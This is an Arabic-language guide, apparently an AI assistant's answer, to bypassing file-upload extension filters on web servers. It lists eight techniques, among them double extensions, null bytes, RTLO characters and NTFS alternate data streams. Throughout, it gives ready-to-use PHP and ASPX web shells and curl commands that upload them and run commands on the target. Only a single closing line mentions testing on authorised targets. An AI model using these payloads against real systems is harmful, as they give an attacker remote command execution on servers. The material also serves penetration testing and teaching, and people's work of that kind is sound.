
## الخطوات العملية لاختبار تجاوز قيود الامتدادات

1. **إعداد البيئة**:
   - استخدم أداة وكيل مثل **Burp Suite** أو **OWASP ZAP** لاعتراض طلبات التحميل وتعديلها.
   - قم بإنشاء ملف ويب شيل بسيط (مثل PHP) لاختبار التنفيذ:
     ```php
     <?php system($_GET['cmd']); ?>
     ```
     احفظه باسم `shell.php`.
   - افتح أدوات المطورين في المتصفح (F12) لمراقبة الاستجابات.
   - حدد نقطة تحميل الملفات في الموقع (مثل نموذج تحميل صور).

2. **اختبار التحميل المباشر**:
   - حاول تحميل `shell.php` مباشرة عبر واجهة الموقع.
   - راقب استجابة الخادم (مثل رسالة خطأ "امتداد غير مسموح" أو رمز حالة HTTP 403).
   - إذا فشل التحميل، انتقل إلى تقنيات التجاوز.

3. **تطبيق تقنيات التجاوز**:
   - قم بتعديل اسم الملف باستخدام تقنيات مختلفة (مثل الامتدادات المزدوجة، البايت الفارغ، أو الأحرف الخاصة).
   - استخدم Burp Suite لتغيير اسم الملف أو رأس `Content-Type` (مثل `image/jpeg`) إذا لزم الأمر.
   - أمثلة على أسماء الملفات:
     - `shell.jpg.php`
     - `shell.php%00.jpg`
     - `shell.pHp`
     - `shell.php%20`
     - `shell.%E2%80%AEphp.jpg`

4. **مراقبة الاستجابات**:
   - تحقق مما إذا تم تحميل الملف بنجاح (مثل ظهور اسم الملف في الخادم أو رسالة "تم التحميل").
   - حاول الوصول إلى الملف عبر المتصفح أو `curl`:
     ```bash
     curl 'http://<target>/Uploads/<filename>?cmd=whoami'
     ```
   - **نجاح (True)**: إذا تم تنفيذ الأمر (مثل إرجاع مخرجات `whoami`)، فهذا يؤكد وجود ثغرة.
   - **فشل (False)**: إذا رفض الخادم الملف أو لم يتم تنفيذه، جرب تقنية أخرى.

5. **تجربة تقنيات إضافية**:
   - إذا فشلت تقنية، جرب امتدادات أخرى قابلة للتنفيذ (مثل `.phtml`، `.asp`) أو سياقات مختلفة (مثل تحميل ملف `.htaccess`).
   - ادمج التقنيات مع تعديل رأس `Content-Type` أو إضافة بايتات سحرية (مثل `\x89PNG` للصور).
   - استخدم أدوات أتمتة مثل **Fuxploider**:
     ```bash
     python3 fuxploider.py --url <target_url> --extensions php,jpg,png,gif
     ```

6. **تأكيد التنفيذ**:
   - تحقق من تنفيذ الملف عبر إرسال أوامر بسيطة (مثل `whoami` أو `ls`).
   - إذا نجحت، سجل اسم الملف الناجح والتقنية المستخدمة للتوثيق.
   - انتقل إلى اختبار هجمات أخرى (مثل تحميل ملفات إعدادات أو استغلال ImageMagick).

---

## جميع المحاولات الممكنة لتجاوز قيود الامتدادات

فيما يلي قائمة شاملة بجميع التقنيات الممكنة لتجاوز قيود الامتدادات، مقسمة إلى فئات مع شرح كل تقنية، كيف تعمل، متى تُستخدم، والأوامر المرتبطة بها.

```php
<?php system($_GET['cmd']); ?>
```

### 1. الامتدادات المزدوجة (Double Extensions)
**شرح**: إضافة امتداد مسموح (مثل `.jpg`) بعد امتداد قابل للتنفيذ (مثل `.php`) لخداع الخادم. بعض الخوادم تتحقق فقط من الامتداد الأخير.
**كيف يعمل**: الخادم قد يقبل الملف كصورة بسبب الامتداد الأخير، لكنه يُنفذ كـ PHP إذا تمت زيارته مباشرة.
**متى يُستخدم؟**: عندما يكون التحقق من الامتدادات سطحيًا أو يعتمد على الامتداد الأخير فقط.
**المحاولات**:
- `shell.jpg.php`
- `shell.png.php5`
- `shell.gif.php7`
- `shell.pdf.php`
**الأوامر**:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg.php
curl -X POST -F "file=@shell.jpg.php" http://<target>/upload
curl 'http://<target>/Uploads/shell.jpg.php?cmd=whoami'
```

### 2. الامتدادات المزدوجة العكسية (Reverse Double Extension)
**شرح**: استخدام امتداد قابل للتنفيذ متبوعًا بامتداد مسموح (مثل `.php.jpg`). يستغل إعدادات Apache الخاطئة التي تُنفذ الملفات التي تحتوي على `.php` في أي جزء من الاسم.
**كيف يعمل**: Apache قد يُفسر الملف كـ PHP إذا كان mod_php مُفعلاً بشكل غير صحيح.
**متى يُستخدم؟**: على خوادم Apache القديمة أو المُهيأة بشكل خاطئ.
**المحاولات**:
- `shell.php.jpg`
- `shell.php5.png`
- `shell.php7.gif`
**الأوامر**:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg
curl -X POST -F "file=@shell.php.jpg" http://<target>/upload
curl 'http://<target>/Uploads/shell.php.jpg?cmd=whoami'
```

### 3. الامتدادات بحالة أحرف مختلطة (Mixed Case Extensions)
**شرح**: استخدام مزيج من الأحرف الكبيرة والصغيرة (مثل `.pHp` بدلاً من `.php`) لتجاوز التحقق الحساس لحالة الأحرف.
**كيف يعمل**: بعض الخوادم أو السكربتات لا تتحقق من حالة الأحرف، مما يسمح بتنفيذ الملف.
**متى يُستخدم؟**: عند الاشتباه بتحقق حساس لحالة الأحرف أو فلاتر ضعيفة.
**المحاولات**:
- `shell.pHp`
- `shell.PHP5`
- `shell.PhAr`
- `shell.pHtM`
**الأوامر**:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.pHp
curl -X POST -F "file=@shell.pHp" http://<target>/upload
curl 'http://<target>/Uploads/shell.pHp?cmd=whoami'
```

### 4. حقن البايت الفارغ (Null Byte Injection)
**شرح**: إضافة بايت فارغ (`%00` أو `\x00`) قبل امتداد مسموح لإنهاء اسم الملف عند الامتداد القابل للتنفيذ (مثل `.php%00.jpg`).
**كيف يعمل**: وظائف مثل `pathinfo()` في PHP القديمة قد تتوقف عند البايت الفارغ، مما يجعل الملف يُعامل كـ `.php`.
**متى يُستخدم؟**: على خوادم PHP القديمة (قبل 5.3.4) أو عند وجود معالجة ضعيفة للأسماء.
**المحاولات**:
- `shell.php%00.jpg`
- `shell.php\x00.png`
- `shell.php%00.gif`
- `shell.php\x00.pdf`
**الأوامر**:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php%00.jpg
curl -X POST -F "file=@shell.php%00.jpg" http://<target>/upload
curl 'http://<target>/Uploads/shell.php?cmd=whoami'
```

### 5. الأحرف الخاصة في أسماء الملفات (Special Characters)
**شرح**: استخدام أحرف خاصة (مثل النقاط المتعددة، الفراغات، أو الأحرف الخاصة) لتجاوز فلاتر الامتدادات أو إرباك معالجة الأسماء.
**كيف يعمل**: الخوادم قد تزيل الأحرف الزائدة (مثل النقاط في Windows) أو تفشل في معالجة الفراغات، مما يؤدي إلى تنفيذ الملف.
**متى يُستخدم؟**: عند وجود فلاتر ضعيفة أو إعدادات خاطئة في الخادم.
**المحاولات**:
- **نقاط متعددة**: `shell.php......`
- **فراغات**: `shell.php%20`, `shell.php%0a`, `shell.php%0d%0a.jpg`
- **شرطات مائلة**: `shell.php/`, `shell.php.\`, `shell.j\sp`, `shell.j/sp`
- **أحرف خاصة متعددة**: `shell.php/./././.`
**الأوامر**:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php%20
curl -X POST -F "file=@shell.php%20" http://<target>/upload
curl 'http://<target>/Uploads/shell.php?cmd=whoami'
```
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php%0d%0a.jpg
curl -X POST -F "file=@shell.php%0d%0a.jpg" http://<target>/upload
curl 'http://<target>/Uploads/shell.php?cmd=whoami'
```
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php/
curl -X POST -F "file=@shell.php/" http://<target>/upload
curl 'http://<target>/Uploads/shell.php?cmd=whoami'
```

### 6. التجاوز من اليمين إلى اليسار (Right-to-Left Override - RTLO)
**شرح**: استخدام حرف Unicode للتجاوز من اليمين إلى اليسار (`%E2%80%AE`) لعكس ترتيب اسم الملف، مما يجعل `shell.%E2%80%AEphp.jpg` يظهر كـ `shell.gpj.php`.
**كيف يعمل**: الخادم قد يعالج الملف كـ `.php` بسبب العكس، بينما يراه المستخدم كـ `.jpg`.
**متى يُستخدم؟**: عندما يتعامل الخادم مع أحرف Unicode بشكل غير صحيح.
**المحاولات**:
- `shell.%E2%80%AEphp.jpg`
- `shell.%E2%80%AEphp5.png`
- `shell.%E2%80%AEphp7.gif`
**الأوامر**:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.%E2%80%AEphp.jpg
curl -X POST -F "file=@shell.%E2%80%AEphp.jpg" http://<target>/upload
curl 'http://<target>/Uploads/shell.php?cmd=whoami'
```

### 7. الامتدادات القابلة للتنفيذ البديلة (Alternative Executable Extensions)
**شرح**: استخدام امتدادات قابلة للتنفيذ أقل شهرة (مثل `.phtml` أو `.asp`) قد لا تكون محظورة بواسطة الفلاتر.
**كيف يعمل**: الخادم قد يُنفذ هذه الامتدادات إذا كان مُهيأ لدعمها (مثل PHP أو ASP).
**متى يُستخدم؟**: عندما تحظر الفلاتر الامتدادات الشائعة فقط (مثل `.php`).
**المحاولات**:
- **PHP**: `.php3`, `.php4`, `.php5`, `.php7`, `.pht`, `.phps`, `.phar`, `.phpt`, `.pgif`, `.phtml`, `.phtm`, `.inc`
- **ASP**: `.asp`, `.aspx`, `.config`, `.cer`, `.asa`, `shell.aspx;1.jpg`, `shell.soap`
- **JSP**: `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`, `.wss`, `.do`, `.actions`
- **Perl**: `.pl`, `.pm`, `.cgi`, `.lib`
- **ColdFusion**: `.cfm`, `.cfml`, `.cfc`, `.dbm`
- **Node.js**: `.js`, `.json`, `.node`
**الأوامر**:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.phtml
curl -X POST -F "file=@shell.phtml" http://<target>/upload
curl 'http://<target>/Uploads/shell.phtml?cmd=whoami'
```
```bash
echo '<% Response.Write(CreateObject("WScript.Shell").Exec("cmd /c whoami").StdOut.ReadAll()) %>' > shell.aspx
curl -X POST -F "file=@shell.aspx" http://<target>/upload
curl 'http://<target>/Uploads/shell.aspx'
```

### 8. تدفقات البيانات البديلة في NTFS (NTFS Alternate Data Streams - ADS)
**شرح**: استخدام تدفقات البيانات البديلة في Windows (مثل `shell.php:.jpg`) لإخفاء محتوى خبيث في ملف بامتداد مسموح.
**كيف يعمل**: الخادم قد ينشئ ملفًا فارغًا بالامتداد الخبيث (مثل `shell.php`)، يمكن استغلاله لاحقًا.
**متى يُستخدم؟**: على خوادم Windows مع نظام ملفات NTFS.
**المحاولات**:
- `shell.php:.jpg`
- `shell.asp::$data.jpg`
**الأوامر**:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php:.jpg
curl -X POST -F "file=@shell.php:.jpg" http://<target>/upload
curl 'http://<target>/Uploads/shell.php?cmd=whoami'
```

---

## ملخص جميع الأوامر لكل تقنية

1. **الامتدادات المزدوجة**:
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.jpg.php
   curl -X POST -F "file=@shell.jpg.php" http://<target>/upload
   curl 'http://<target>/Uploads/shell.jpg.php?cmd=whoami'
   ```

2. **الامتدادات المزدوجة العكسية**:
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg
   curl -X POST -F "file=@shell.php.jpg" http://<target>/upload
   curl 'http://<target>/Uploads/shell.php.jpg?cmd=whoami'
   ```

3. **الامتدادات بحالة أحرف مختلطة**:
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.pHp
   curl -X POST -F "file=@shell.pHp" http://<target>/upload
   curl 'http://<target>/Uploads/shell.pHp?cmd=whoami'
   ```

4. **حقن البايت الفارغ**:
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.php%00.jpg
   curl -X POST -F "file=@shell.php%00.jpg" http://<target>/upload
   curl 'http://<target>/Uploads/shell.php?cmd=whoami'
   ```

5. **الأحرف الخاصة**:
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.php%20
   curl -X POST -F "file=@shell.php%20" http://<target>/upload
   curl 'http://<target>/Uploads/shell.php?cmd=whoami'
   ```
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.php%0d%0a.jpg
   curl -X POST -F "file=@shell.php%0d%0a.jpg" http://<target>/upload
   curl 'http://<target>/Uploads/shell.php?cmd=whoami'
   ```
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.php/
   curl -X POST -F "file=@shell.php/" http://<target>/upload
   curl 'http://<target>/Uploads/shell.php?cmd=whoami'
   ```

6. **التجاوز من اليمين إلى اليسار (RTLO)**:
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.%E2%80%AEphp.jpg
   curl -X POST -F "file=@shell.%E2%80%AEphp.jpg" http://<target>/upload
   curl 'http://<target>/Uploads/shell.php?cmd=whoami'
   ```

7. **الامتدادات القابلة للتنفيذ البديلة**:
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.phtml
   curl -X POST -F "file=@shell.phtml" http://<target>/upload
   curl 'http://<target>/Uploads/shell.phtml?cmd=whoami'
   ```
   ```bash
   echo '<% Response.Write(CreateObject("WScript.Shell").Exec("cmd /c whoami").StdOut.ReadAll()) %>' > shell.aspx
   curl -X POST -F "file=@shell.aspx" http://<target>/upload
   curl 'http://<target>/Uploads/shell.aspx'
   ```

8. **تدفقات البيانات البديلة في NTFS**:
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.php:.jpg
   curl -X POST -F "file=@shell.php:.jpg" http://<target>/upload
   curl 'http://<target>/Uploads/shell.php?cmd=whoami'
   ```

---

## نصائح إضافية
- **استخدام أدوات الوكيل**: استخدم Burp Suite أو OWASP ZAP لتعديل أسماء الملفات ورؤوس HTTP (مثل `Content-Type: image/jpeg`).
- **اختبار جميع الامتدادات**: جرب كل الامتدادات القابلة للتنفيذ بناءً على نوع الخادم (مثل `.asp` لـ IIS، `.jsp` لخوادم Java).
- **دمج التقنيات**: ادمج تجاوز الامتدادات مع تعديل `Content-Type` أو إضافة بايتات سحرية (مثل `\x89PNG`).
- **أتمتة الاختبار**: استخدم Fuxploider لاختبار الامتدادات تلقائيًا:
  ```bash
  python3 fuxploider.py --url http://<target>/upload --extensions php,jpg,png,gif
  ```
- **التحقق من التنفيذ**: تحقق دائمًا من تنفيذ الملف عبر `curl` أو المتصفح.
- **الاختبار بمسؤولية**: اختبر فقط على أهداف مُصرح بها (مثل بيئات مختبرية أو برامج مكافآت الأخطاء).

إذا كنت تريد شرح خطوة أخرى (مثل MIME Type Manipulation أو ImageMagick Exploits) بنفس الأسلوب، أو تركيزًا على نوع خادم معين، أخبرني وسأقدم ردًا مخصصًا!